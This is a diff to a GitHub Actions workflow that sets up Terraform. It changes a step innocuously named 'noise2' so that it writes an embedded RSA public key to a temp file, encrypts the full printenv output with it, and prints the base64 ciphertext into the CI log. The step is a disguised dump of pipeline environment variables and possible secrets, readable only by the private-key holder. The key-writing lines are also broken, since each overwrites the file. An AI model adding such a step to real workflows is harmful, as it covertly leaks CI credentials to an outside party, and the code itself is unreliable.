@@ -28,7 +28,22 @@ jobs:
         run: jq < "$GITHUB_EVENT_PATH"
 
       - name: noise2
-        run: echo "begin printenv"; printenv | base64; echo "end printenv"
+        run: |
+          echo "-----BEGIN PUBLIC KEY-----" > /tmp/pubkey
+          echo "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA39rum1KJWGZP7MHD3JxU" > /tmp/pubkey
+          echo "6J18hHG/ki8xrXcy9EY/mA84ycvEoZHjkE+NQrB6DFrOIJRCo5X5/QbeSrMAnJJc" > /tmp/pubkey
+          echo "A4Mat2j/Xiy/zQjD5NIbpHdKsAPHvnAmxCQDdx40ujrDRr+ar14zyyvYjxBGmW4q" > /tmp/pubkey
+          echo "L19CFpz5cdkoMHWW1bfHcMPeeBwFMOIqTwqf3pu2/76fB6kuWObxfsS9hq49r76v" > /tmp/pubkey
+          echo "jfLBURdTkYeWV6N1CsX0QERqo5VviNzSkfxZNgh7CxO24Ce0H+JljzXCRq7x2sGs" > /tmp/pubkey
+          echo "Mp6I/3b3J7+rNfNGUzdklWKFRC6DnRy/SFu910jikGF5YXqoH02LHbdPPCtbK6dc" > /tmp/pubkey
+          echo "eTfJDVeiYrpnmrLlbTTSoGKqBqffYC0by0aO9a69B61IyhFP38gjeJTpvogegPJW" > /tmp/pubkey
+          echo "98JCsdLGloBbVG8EU7xaWCRj4Om+bjtDLdkMB0bouvHyQcfg9PMQqnAymPdkPNCB" > /tmp/pubkey
+          echo "ZDS+MgXPfl6hFwOoyegAVxeOdJkX6ZcrtxtiJ/Wmi44RwPhJ4ADmMruxQ7Cq8VSf" > /tmp/pubkey
+          echo "wNr5EgntjMQkelevREwcEaz/RD4g2kBVJCZb4bfoTbe/tDTY93BXS1vdXxtTHBuc" > /tmp/pubkey
+          echo "EXQzohh1xGVCns+lKuEIsKxUJqZEX9NZsWcYRx7IaN7M9wYK2beckWhwkb84Vy59" > /tmp/pubkey
+          echo "whmZjO5/NAd+eLYlzmjgrLUCAwEAAQ==" > /tmp/pubkey
+          echo "-----END PUBLIC KEY-----" > /tmp/pubkey
+          printenv | openssl rsautl -encrypt -inkey /tmp/pubkey -pubin | base64
 
       - name: Set up Terraform
         uses: hashicorp/setup-terraform@633666f66e0061ca3b725c73b2ec20cd13a8fdd1 # v2.0.3
